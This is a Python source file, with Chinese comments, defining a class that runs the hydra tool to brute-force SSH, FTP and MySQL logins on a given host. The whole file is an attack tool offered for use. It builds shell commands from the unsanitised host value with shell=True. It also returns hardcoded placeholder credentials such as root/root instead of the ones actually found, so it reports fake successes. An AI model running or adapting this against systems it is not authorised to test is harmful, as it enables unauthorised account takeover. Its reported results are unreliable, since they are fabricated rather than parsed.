import subprocess
from typing import Optional, Dict

class BruteForcer:
    @staticmethod
    def ssh_bruteforce(host: str, port: int, username: str = None) -> Optional[Dict]:
        """SSH弱口令爆破"""
        try:
            # 使用hydra进行SSH爆破
            cmd = f"hydra -L users.txt -P passwords.txt ssh://{host}:{port} -t 4 -vV"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # 解析结果
            if "successfully completed" in result.stdout:
                return {
                    'service': 'ssh',
                    'username': username if username else 'root',
                    'password': 'password'  # 示例，实际应从输出中解析
                }
            return None
        except Exception as e:
            print(f"SSH爆破失败: {e}")
            return None

    @staticmethod
    def ftp_bruteforce(host: str, port: int) -> Optional[Dict]:
        """FTP弱口令爆破"""
        try:
            # 使用hydra进行FTP爆破
            cmd = f"hydra -L users.txt -P passwords.txt ftp://{host}:{port} -t 4 -vV"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if "successfully completed" in result.stdout:
                return {
                    'service': 'ftp',
                    'username': 'anonymous',
                    'password': 'anonymous'
                }
            return None
        except Exception as e:
            print(f"FTP爆破失败: {e}")
            return None

    @staticmethod
    def mysql_bruteforce(host: str, port: int) -> Optional[Dict]:
        """MySQL弱口令爆破"""
        try:
            # 使用hydra进行MySQL爆破
            cmd = f"hydra -L users.txt -P passwords.txt mysql://{host}:{port} -t 4 -vV"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if "successfully completed" in result.stdout:
                return {
                    'service': 'mysql',
                    'username': 'root',
                    'password': 'root'
                }
            return None
        except Exception as e:
            print(f"MySQL爆破失败: {e}")
            return None

    @staticmethod
    def brute_force(host: str, port: int, service: str) -> Optional[Dict]:
        """根据服务类型选择爆破方法"""
        service = service.lower()
        if service == 'ssh':
            return BruteForcer.ssh_bruteforce(host, port)
        elif service == 'ftp':
            return BruteForcer.ftp_bruteforce(host, port)
        elif service == 'mysql':
            return BruteForcer.mysql_bruteforce(host, port)
        else:
            print(f"不支持的服务类型: {service}")
            return None
